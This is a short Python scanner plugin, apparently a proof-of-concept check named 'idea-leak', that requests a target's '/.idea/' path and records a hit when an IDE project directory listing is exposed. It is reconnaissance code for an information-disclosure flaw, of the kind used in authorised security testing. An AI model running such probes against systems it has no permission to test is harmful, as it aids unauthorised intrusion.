#!/usr/bin/env python
# coding=utf-8
import requests
from report.report import save

pocname = "idea-leak"
headers = {'Content-Type': 'application/x-www-form-urlencoded','User_Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}

def verify(arg, **kwargs):
	exploit1 = "/.idea/workspace.xml"
	exploit2 = "/.idea/modules.xml"
	exploit3 = "/.idea/"
	try:
		r1 = requests.get(url=arg+exploit3,headers=headers,timeout=5)
		if "Directory: /.idea/" in r1.text:
			save(arg,pocname,exploit3)
			return {"url": arg, "poc-name":pocname, "exploit": exploit3}
	except Exception as e:
		pass